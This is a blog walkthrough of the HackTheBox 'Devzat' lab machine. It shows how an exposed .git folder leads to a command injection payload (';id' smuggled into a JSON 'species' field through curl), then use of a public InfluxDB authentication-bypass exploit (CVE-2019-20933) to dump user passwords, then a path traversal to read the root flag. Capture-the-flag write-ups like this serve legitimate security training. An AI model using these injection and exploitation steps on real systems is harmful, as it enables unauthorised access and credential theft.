---
title: "HackTheBox: \"Devzat\" Walkthrough"
date: 2022-04-26
tags: ['hackthebox', 'ctf']
categories: ["HackTheBox Walkthrough"]
slug: "hackthebox-devzat-walkthrough"
draft: false
---

I'd say *Devzat* is a nice machine to start with. It requires basic
scanning techniques, but the clues are rather obvious and easy to
follow.<!--more-->

## Foothold

Let's start with an nmap scan - we'll find the usual open ports `22/tcp` and `80/tcp`,
but there is more (snippet from the nmap output):


```plain
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
```

So there is an additional SSH server running on port 8000. The machine names
on HackTheBox are usually also a hint, and a search reveals
[a GitHub repository](https://github.com/quackduck/devzat) containing
a chat server called *devzat*, based on SSH. (Even without searching for
or finding this repository, it would be a good idea to try connecting
to this server. Furthermore, the landing page on port 80 explicitly tells how to
connect to this chatserver.)

We can connect the server, but it looks like we can't do anything interesting:

```plain
$ ssh -l root devzat.htb -p 8000 -oHostKeyAlgorithms=+ssh-rsa
Welcome to the chat. There are no more users
devbot: root has joined the chat
root: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
root:
```

But we are also not yet finished with scanning:
* A directory scan on the landing page does not yield anything
* A vhost scan will reveal the domain `pets.devzat.htb`. We visit this domain
and play around a bit, but it's not clear how we can utilize this site.
* Finally, a directory scan on this subdomain reveals a `.git` folder!

We can access `http://pets.devzat.htb/.git/` and see that directory
listing is also enabled - that's very convenient and makes it easy
to download the contents of the git folder.
For this task, there is also a nifty tool called [git-dumper](https://github.com/arthaud/git-dumper),
which can also be used if directory listing is disabled.

As we now have access to the source of the site, let's dig into it -
the following lines are the interesting pieces inside `main.go`:
```go
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	// ...
}

func addPet(w http.ResponseWriter, r *http.Request) {
	// ...
	addPet.Characteristics = loadCharacter(addPet.Species)
	// ...
}
```
We found a pretty obvious RCE!


## User

Let's try the RCE we just found:
```plain
$ curl -X POST 'http://pets.devzat.htb/api/pet' -d '{"name":"test","species":";id"}'
```

Visiting the website then shows this entry:
> cat: characteristics/: Is a directory uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)

Now, we just have to upload our SSH pubkey and can then login as user "patrick".
Unfortunately, there is no user flag in patrick's home directory. Upon listing
the `/home` directory, we notice there is another user called "catherine".

I like reading source code, so I'm having a look in the `devzat` folder in patrick's
home dir. In `~/devzat/devchat.go` we see there is some special handling when
we are connecting locally:
```plain
patrick@devzat:~$ ssh 127.0.0.1 -p 8000
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
```

*(Yeah, it seems a bit made up that the chat history is hard coded in the
source files of the chat server - but let's just accept it. After all, it could
also be a "real" chat server that stores the history somewhere and replays the
chat backlog upon connecting.)*

Thus, the next clue is: InfluxDB. The default port for the InfluxDB HTTP service
is 8086, and using netstat we can see this port is indeed listened to, so let's probe it:

```plain
patrick@devzat:~$ wget --server-response http://127.0.0.1:8086
--2022-04-25 12:53:08--  http://127.0.0.1:8086/
Connecting to 127.0.0.1:8086... connected.
HTTP request sent, awaiting response...
  HTTP/1.1 404 Not Found
  Content-Type: text/plain; charset=utf-8
  X-Content-Type-Options: nosniff
  X-Influxdb-Build: OSS
  X-Influxdb-Version: 1.7.5
  Date: Mon, 25 Apr 2022 12:53:08 GMT
  Content-Length: 19
```

Nice, so we now got a version number: 1.7.5. That makes it much easier to look
for known exploits - in this case:

> **CVE-2019-20933:** InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

It's always a good idea to search for the CVE number together with *"github"*
and/or *"poc"*. In this case, we quickly find a [GitHub repository](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) with a Python script to exploit vulnerable InfluxDB versions.
We can upload this script to the machine and try to run it there - but this will
fail because some packages are missing. So I'll just use SSH forwarding for port 8086
and run the script on my machine (I've compacted the output a bit):

```plain
Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: devzat
[admin@127.0.0.1/devzat] $ show measurements;
                    "values": [
                        [
                            "user"
                        ]
[admin@127.0.0.1/devzat] $ select * from "user";
{
                    "values": [
                        [
                            "<password>",
                            "catherine"
                        ],
```
Now just `su catherine` and we can read the user flag!

## Root

We already had some success when connecting to the chatserver as "patrick", so let's
try again as "catherine":

```plain
catherine@devzat:~$ ssh 127.0.0.1 -p 8000
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
```

Let's follow the trail:


```plain
catherine@devzat:~$ ssh 127.0.0.1 -p 8443
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
```

Again, pretty obvious hints. In `/var/backups` we will find `devzat-dev.zip` and `devzat-main.zip`.
I didn't diff the two files but instead directly looked at the contents of
the `devzat-dev.zip` file, more specifically the `commands.go` file.

It doesn't take long until we notice:
```go
file = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
```
... with the implementation of this command right next to it (only interesting lines shown):
```go
func fileCommand(u *user, args []string) {
// ...
        // Check my secure password
        if pass != "<password>" {
                u.system("You did provide the wrong password")
                return
        }
// ...
}
```

All right, let's try this command:

```plain
catherine@devzat:~$ ssh 127.0.0.1 -p 8443
catherine: /file ../root.txt <password>
[SYSTEM] <flag>
```

## Conclusion and Learnings

All in all, this machine was pretty much straight forward.
The foothold required quite a bit of scanning, but after finding
the first RCE the next hints were not subtle. It took me
a moment to figure out how InfluxDB works,
because I've never used it before, though.